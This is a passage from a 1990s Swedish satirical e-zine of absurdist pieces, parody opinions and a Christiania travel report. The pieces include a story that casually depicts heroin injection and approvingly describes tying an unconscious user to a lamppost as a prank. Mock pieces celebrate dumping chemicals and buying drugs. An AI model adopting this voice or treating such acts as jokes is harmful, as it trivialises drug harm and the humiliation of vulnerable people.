på kvällarna. Alla vet ju att man inte kan vara vaken en hel natt på ett
raveparty eller en klubb utan att ha tagit knark, och det stämmer även med
oss, vi är ju inte mer än människor!"

Jag har noterat att David hela tiden sitter och skakar på ett lustigt sätt
och undrar lite varför han gör det, så jag frågar.

- David, varför sitter du och skakar som du gör? Har du abstinens eller nått?
Jag tycker mig känna igen symptomen!

"Ja, det är det. Jag har inte tagit heroin på flera timmar. Är det okej om
jag skjuter upp här?"

- Ja för tusan. Skjut på du. Är det okej om jag tar några kort?

"Nej, nej, nej! Det går inte! Hur skulle det se ut!?"

- Nej, jag förstår, det var en dum fråga.

"Ja, det var det."

David tar fram en sked och ett stearinljus och börjar fixa varorna. Efter en
stund tar han fram en spruta och fyller den med drömvätska.

- Ja, då är det dags att skjuta upp då? In med kanylen bara!

"Jaja. Jag kanske kommer vara lite borta en stund, men det är bara som det
ska."

- Okej.

David skjuter upp och ramlar snart ner på golvet med sprutan hängandes i
venen. Jag passar på att ta några fina bilder på honom när han ligger i
fosterställning på golvet. Fina bilder! Dom hamnade i mitt fina bildkollage.
Efter drygt en halvtimme vaknar han upp, då har jag bundit fast honom vid en
lyktstolpe vid polishuset i Nacka. Han har fortfarande kanylen i armen. Sen
ringer jag in ett annonymt tips till Aftonbladet som genast blir till sig av
lycka när dom får mer nyheter att gotta sig i. Jag berättar att det står en
galen, naken man utanför polishuset i Nacka. Sen traskar jag lyckligt hem för
att skriva denna text.


// Doktor Fantasi of Glögg records


------------------------------------------------------------------------------


*******************************************
* GARANTERAT P0LiTiSKT iNK0RREKTA ÅSiKTER *
*******************************************

Folk tycker en massa saker. En klassisk uppställning i marmor, med de tvenne
stolta galjonsfigurerna och deras stolta lejonmanar stolt fladdrande i den
stolta åsiktsvinden som politikerna har tagit för vana att vända sina kappor
efter. De tvenne galjonsfigurernas namn? Tycho Brahe och Tycho Dååligh!

(Jävligt högstående skämt i det här zinet, eller hur?)

Nu är det dags även för oss att tycka till.

--

Fan, jag verkligen äääälskar ju Eros Ramazotti och svensk reklamradio. Tom
Cruise har också varit väldigt viktig för mig. The Beatles var väl OK, fast
bara de första två albumen, sedan gick det utför. Fast några bra låtar fanns
det ju på de sena albumen också, som "Yellow Submarine" och "Michelle".

--

Det sägs ibland att vi lever i ett fritt samhälle, där var och en har ett
fritt val i många situationer. Just nu är det dags att göra ett val som
kommer att följa dig genom livet...

Pick your Spice Girl (1-5):

1. Posh Spice
2. Sporty Spice
3. Scary Spice
4. Baby Spice
5. Sexy Spice

Köp dig en Spice Girl, om du tror att hon kan värma dig när det blåser kallt.
Men kom ihåg att du ska älska henne i nöd och lust. (Inget öppet köp, ingen
bytesrätt!)

--

Den postmoderna splittringen av subjektet - det finns inget sant jag, bara
olika roller som spelas vid olika tillfällen; ett stort antal ryska dockor
inuti varandra och längst in - bara tomhet. Ingen innersta docka som inte går
att öppna... bla Derrida bla bla Husserl bla bla Sokal bla

--

För övrigt hatar vi miljön, och fnittrar psykotiskt med stirrande ögon när vi
häller i ett kilo akrylamid i toaletten varje kväll och spolar så att det
rinner rakt igenom det buggande reningsverket ut i de allvarligt angripna
svenska vattendragen. alt.pave.the.earth för helvete!!! GIFTTUNN0R!!
DUMPNiNG!!!

--

Har ni aldrig någonsin funderat på varför alla svenska banker har sina
huvudkontor så nära Malmskillnadsgatan i Stockholm? Det har vi gjort.

Det är dessutom intressant att politikerna på toppnivå måste hålla olika
uppgörelser just i Amsterdam. Vad är det för fel på de svenska hororna? Duger
de inte åt era åldrade gammelmansorgan?

Ofta är det ack så givande att gå igenom saker på en väldigt elementär
dagisnivå. Ett exempel på en sådan fråge- och svarssession kan vara som
följer:

- Vad ska vi ha politiker och hela deras "system" till?
- De är till för att motverka marknadskrafterna, för att värna om individen
så att denne inte blir dåligt behandlad av storföretagen.
- Men varför har inte de svenska politikerna gjort detta de senaste
decennierna då? Om detta är deras enda roll, och de helt har kommit från
denna roll för att ägna sig åt skräp, är ju deras yrkesroll helt förfelad.

Göran Persson och Göran Persson .. Men han äger väl inga tröjor från vare sig
Fred Perry eller Lonsdale? Har han någonsin varit på JUS och kollat in deras
direktimporterade jackor från Londonmärket Vexed Generations? Nej men då så..
Köp lite speed garage-tolvor och håll käft. Gubbjävel.

Dessutom föredrar vi absolut EMM och EMS framför EMU. Strictly data jämt!!

Den fascistiska fascistfascismen är en fascistisk fascism, som måste ses som
till stora delar fascistisk då den på många sätt kan ses som en fascistisk
fascist-fascism som är avgjort fascistisk, fascistisk samt fascistisk. Lilla
Smurfan! Kataleptisk föreställning! Georg Cantor, för helvete!

Lille katt
Lille katt
Kattens päls är svart som natt

Lille katt
Lille katt
Katten har fått fnatt

--

Begreppet "vinnare" (nej, jag skrev inte "vinare", läs ordentligt nästa gång)
är också intressant. Många själviska människor verkar tro att de är ena
riktiga vinnare om de tjänar mycket pengar och gör karriär. Låt mig då påpeka
att alla medarbetarna på det pennalistiska underhållningsprogrammet
"Expedition: Robinsson" (mediajobb, tufft värre?) och de gamla läkarna som
tvångssteriliserade tattare i Sverige för ett fåtal decennier sedan var högst
välutbildade med flådiga villor och dyra vanor. Trots detta är bägge dessa
yrkesgrupper så misslyckade som man kan bli. Att ha lyckats handlar inte om
årsinkomst utan om passion och moral.

Vi är heller inte alltför intresserade av alla dessa IT-horor, med limegröna
logos och spermafläckar på stjärten. Ta bort Sprayskräpet! De är överflödiga!
Att tjäna pengar på websidor, eller att "LÄGGA UPP SiG PÅ iNTERNET" som vi
brukar kalla det, kan ju aldrig ses som en värdefull sysselsättning, då en
Internetsida endast har ett existensberättigande om den är okommersiell och
gjord av privatpersoner för att sprida information om deras hobbys. Allt
övrigt är skräp och ska avlägnas med pincett från nätet.

"I'm the operator of my Internet connection / By pressing down a special
key / it does a world-wide search for me / I'm the operator of my Internet
connection"

För övrigt tycker vi att medelklassen kan ses som en typ av jättebebisar. Är
det inte meningen att man ska växa ifrån stadiet "VILL HA! MIG! MER!" vid en
relativt låg ålder? Om man ser på vissa människor som studerar ekonomi vid
Stockholms Universitet så verkar denna process ha avstannat någonstans på
vägen.

Vi är lika hårt principfasta som Mats Hinze. Därmed blir vi också lika
odrägliga att ha att göra med som Hinze.

Bill Gates och Steven Spielberg är de två mest tragiska människor vi känner
till, eftersom de inte har lyckats med något annat än att roffa pengar. Bill
leder ett företag som gör usel mjukvara, och Steven gör lite usla filmer, men
det är ju inget att bry sig om eftersom det finns tusen och åter tusen bättre
programmerare och regissörer. De enda egenskaper de har som blir kvar är att
de är rika, och det är ju inte viktigt.

Att sparka på de som är svagare och att skamset smyga iväg med svansen mellan
benen när de starkare sparkar på en är inte någon spännande egenskap. Det
brukar t ex hundar klara av riktigt bra. Även de är medvetna om att det finns
något som heter ägande, eftersom de gräver ner ben i jorden. Att vara
människa måste således innehålla mer än hierarkibyggande och roffande av
materiella fördelar.

FLYTOCARRYEACHHISBURDENWEAREYOUNGDESPITETHEYEARSWEARECONCERN
flytocarryeachhisburdenweareyoungdespitetheyearsweareconcern

WEAREHOPEDESPITETHETIMES
wearehopedespitethetimes

--

Tyska coveralbum med Hansen: "Der Mmm-bop" och Heidegger and the Bass Aces:
"I saw dasein, and it opened up my eyes, I saw dasein".

Skalman: -Coverversionernas plastiga förljugenhet, och den oerhörda
fokuseringen på yta! Hanson i OKEJ: "Vi vill flytta till Ljungby och bli
elektroingenjörer!!". Stort scoop i nästa Veckorevyn.

--

Vi har sett komplotten! Illuminatimaffian är tillbaks, och den här gången
verkar det som om de kommer att lyckas att förslava oss. Så här är det: det
finns en typ av smörgåsar som heter submarines. En stor kedja som säljer
sådana heter Sandy's, och finns lite överallt i Stockholm. De poppar ständigt
upp på nya ställen - precis som roliga Magic Mushrooms ute i skogen om hösten.
Varför öppnar de nya ställen så ofta? Vi har alla svar, precis som ni har
vant er vid från andra typer av media... Iallafall, vi har nu från en säker
källa fått reda på att Sandy's vill ta över världen. Deras fyllning i
smörgåsarna är beroendeframkallande, så all ohyra till hippa
medelklass-Stockholmare kommer att fastna i ekorrhjulet och börja göra
inbrott för att få dagens Sandy's-submarine-fix. De kommer att gå ner sig i
smörgåsträsket och ingen gör något åt det! Polisen bara skrattar när vi
ringer och tipsar dem om detta, och ingen av dagstidningarna tar in våra
insändare!! NÅG0T MÅSTE GÖRAS!! ST0PPA SANDY'S!!!

--

c
o
c
a
c
o
l
a

i
s

a
l
w
a
y
s

t
h
e

o
n
e

w
h
e
n
e
v
e
r

t
h
e
r
e

i
s

f
u
n

t
h
e
r
e
s

a
l
w
a
y
s

c
o
c
a
c
o
l
a

--

"VMS a la Playa" var en gammal fin hitlåt från det smaklösa 80-talet. Momo
och de gråa herrarna, som LÄGGER UPP SIN FAMILJS DUKTIGT NORÉNFÖRTRÄNGT
PSYKOTISKT TREVLIGHETSFASCISTISKA ***JULRIM*** PÅ SINA FULA JÄVLA HEMSIDOR
SOM FYLLER UPP HELA DET JÄVLA SATANS HELVETES FÖRBANNADES NÄTET MED bajs när
de Militanta Korvkioskägarna bryter sig in hos Grisens Vänner om natten då vi
håller på att förlora en hel generation 90% skjuter upp familj och förort i
armen istället för metamfetamin samtidigt som den unge VSU-skribenten tror
att han är jävligt underground och rebellisk när han skriver sina texter på
detta sätt utan att förstå att han bara är jobbig vilket råkar pågå vid samma
tidpunkt som kommunalfullmäktige och deras makthavare diskuterar om man ska
meja ner 18 eller 19 uteliggare med kulspruta varje dag för att få ett
nyttigare och mer produktivt samhälle och en anarkist kommer in och föreslår
att de först måste dela ut vapen till uteliggarna så att de har något att
försvara sig med vilket får de feta äldre männen att torka sina rödlätta
svettiga hjärtattacksförberedande pannor och utbrista "nej, vet hut! vi står
högre och vet bättre! därför är det bara vi som ska vara beväpnade!" vilket
fick den unge VSU-skribenten att få med en till punkt på listan av mer eller
mindre begåvade idéer som han ville ha med i detta zine utan att orka skriva
något riktigt av det vilket fick till följd ONearthASitISinHEAVEN
EbeforeCexceptAFTERi att han bara skriver ihop alla dessa överblivna stackars
stackars stackars (humanoid) små överblivna stackars stackars stackars
(humanoid) små överblivna stackars stackars stackars (humanoid) små
överblivna stackars stackars stackars (humanoid) små överblivna stackars
stackars stackars (humanoid) små överblivna stackars stackars stackars
(humanoid) små överblivna stackars stackars stackars (humanoid) små
överblivna stackars stackars stackars (humanoid) små överblivna stackars
stackars stackars (humanoid) små överblivna artikelidéer i en enda totalt
meningslös klump i ett fåfängt försök till att vara Joyce och Ginsberg fast
utan svart basker fast med litet bockskägg eftersom han dog strax efter det
att han överlevde

ICANTTHINKCLEARYOULOOKTOMEFORREASONITSNOTTHEREICANTEVENRHYMEBEGINTHEBEGIN
icantthinkclearyoulooktomeforreasonitsnotthereicantevenrhymebeginthebegin

--

Ännu en reserapport: Japp, vi kom till sist iväg till Christiania. Alla
politiker i hela Köpenhamn verkade motarbeta strömmen av urspårade utländska
hippies, eftersom det var en massa hinder i ens väg från Centralstationen
till denna fristad. Man fick gå långa omvägar, eftersom det var avstängt nere
vid hamnen och dylikt. Men till sist kom vi ut över bron Vad-Den-Nu-Hette
till den stadsdel som fristaden ligger i, och sedan gick det bättre.

Du kan inte missa vägen när du har kommit så långt. Följ bara graffittin på
stadens väggar. Den ska tilltaga i frekvens hela tiden. Om graffittin börjar
minska när du går mot Christiania så har du gått fel.

Väl innanför fristadens stadsmurar ser man en samling av skönt oplanerat
utplacerade hus och en mängd glada danska hippies. Det är lätt att hitta till
Pusher Street med alla hundarna, där man kan köpa soft drugs som man sedan
kan röka - antingen öppet på området eller i skogen bakom om man är blyg.

Vårt intryck av Christiania var positivt - alla verkade ha mer kontroll över
sina liv, ha mer tolerans mot varandra och verkade göra mer för varandra än
vad vanliga skötsamma svenskar brukar göra. Några sålde droger, någon
miljövän levde i harmoni med miljön i något hörn, någon sålde egentillverkade
kläder och smycken, och någon annan jobbade med fristadens fina kulturhus och
dess konserter, konstutställningar och andra fina initiativ.

Schysst ställe, helt klart. Dessutom har ju Köpenhamn iallafall förut haft en
livskraftig husockupationsrörelse, vilket vi också tycker om. Ord till de
svenska ungdomar som ockuperar ett kommunalt hus i utkanten av Stockholm just
nu, förresten. Vi är definitivt på er sida!


// Ofokuserad of F0KUS


------------------------------------------------------------------------------


********************************************************
* P0G0 PEDAG0G PRESENTERAR: "MÄNNiSKAN, EN TAMAG0TCHi" *
********************************************************

Människoliv = Tamagotchi = Det gamla datorspelet "Little Computer People" =
Konstutställningen "Sällskap I-VII".

*BEEP*

Du är en tamagotchi.  ----- Människoliv har olika modes, och inom
varje av dessa modes -------  är allting jävligt mycket mer
förutbestämt och re ---p--- gelstyrt än vad någon av oss egentligen
vill kännas vid. Li ---a-- kt en tamagotchi, eller likt en av de
fiktiva karaktärern ---c- a i datorspelet "Little Computer People",
eller likt en av de ---m-  små gråa varelserna i konstutställningen
"Sällskap I-VII" va ---a-- ndrar vi alla fram och tillbaka i vana
miljöer och gör gam ---n--- la invanda saker. Studier, arbetsliv,
fritid, att träffa k ------- ompisar, att träffa flickor - allt är
totalt förutsägbart o ----- ch tråkar ut oss så jävla mycket.

(Konvertera det där stycket till HTML, utan att använda <PRE> eller <IMG
SRC="..">, om ni kan...)

*BEEP*

Människan är en PacMan. Ivrigt drar vi omkring i jakten på små runda piller i
livets labyrinter. Pillren kan symbolisera trygghet eller pengar eller
kulturella upplevelser eller vad du nu är road av. Samtidigt blir vi alla
jagade av de onda spökena, som egentligen är andra PacMen (PacPersons?
Politiskt korrekt och så) fast de är utklädda. Vissa spöken är dock inte
PacPersons utan den hemske schackexperten till lieman. Alla dessa vill se dig
död. Alla powerpills är slut. Du kan inte vinna, bara ta dig vidare till
nästa level, som innehåller .. fler små runda piller. Grattis Gud.

*BEEP*

Livet i de flådiga fåtöljerna i villorna i Ljungby blir tråkigt efter en
kvart. Man kan ägna de närmaste 15 minuterna efter detta åt att försöka ha
sönder fåtöljerna och den duktiga Bang&Olufsen-TVn och stereon och den
duktiga jävla Aalto-designen, men sedan är intressekapitalet definitivt
förbrukat.

*BEEP*

Problemet är att detta inte bara gäller Ljungby utan allt annat du kan ta dig
för med också. Regelmässigheten lyser bakom allt och förstör, som en
röntgenstråle som obönhörligt avslöjar skelettet inuti de än så länge levande
varelserna.

SHE'LLMAKEABEAUTIFULFOSSILSHE'LLMAKEABEAUTIFULFOSSILSHE'LLMAKEABEAUTIFULFOSSI
she'llmakeabeautifulfossilshe'llmakeabeautifulfossilshe'llmakeabeautifulfossi

Därför skriver vi då och då på VSU, denna litterära motsvarighet till The
Prodigys "Smack My Bitch Up"-video. Men även dessa angelägna zinesalster
tråkar ofta ut oss, då vi är fruktansvärt anti. Visst, zines är ju faktiskt
underground, så man slipper ju skönt nog normalitetens instinktiva
kräkreflex, men det känns ändå inte helt rätt längre.

Från oss alla till er alla: 0nd jul och ett 0nt nytt år 1998!!!!!!!!!!!!


// VSU-redax


